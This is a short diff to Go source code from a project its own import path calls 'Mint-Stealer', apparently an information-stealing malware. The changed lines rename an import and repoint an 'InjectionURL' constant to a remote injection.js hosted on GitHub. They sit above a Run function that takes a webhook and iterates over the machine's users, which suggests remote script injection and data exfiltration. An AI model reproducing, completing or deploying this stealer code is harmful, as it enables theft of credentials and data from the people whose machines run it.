@@ -14,12 +14,12 @@ import (
 
 	"encoding/json"
 
-	"github.com/0xFl4q/1237FHJQSDF1234/utils/hardware"
+	"github.com/0xFl4q/Mint-Stealer/utils/hardware"
 	"github.com/shirou/gopsutil/v3/process"
 )
 
 // Définir le lien d'injection
-const InjectionURL = "https://raw.githubusercontent.com/0xFl4q/tktpascousin/main/injection.js"
+const InjectionURL = "https://raw.githubusercontent.com/0xFl4q/injection/main/injection.js"
 
 func Run(webhook string) {
 	for _, user := range hardware.GetUsers() {
